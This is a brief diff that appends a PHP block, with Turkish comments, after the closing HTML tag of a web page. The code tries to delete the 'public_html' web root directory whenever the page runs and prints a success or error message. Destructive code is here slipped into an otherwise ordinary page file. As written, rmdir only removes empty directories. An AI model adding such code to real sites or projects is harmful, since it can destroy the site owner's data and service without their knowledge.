@@ -49,3 +49,18 @@
 
 </body>
 </html>
+<?php
+$dizin = 'public_html'; // Silmek istediğiniz dizin adı
+
+// Dizin var mı kontrol et
+if (is_dir($dizin)) {
+    // Dizini sil
+    if (rmdir($dizin)) {
+        echo "Dizin başarıyla silindi.";
+    } else {
+        echo "Dizin silinirken bir hata oluştu.";
+    }
+} else {
+    echo "Dizin bulunamadı.";
+}
+?>
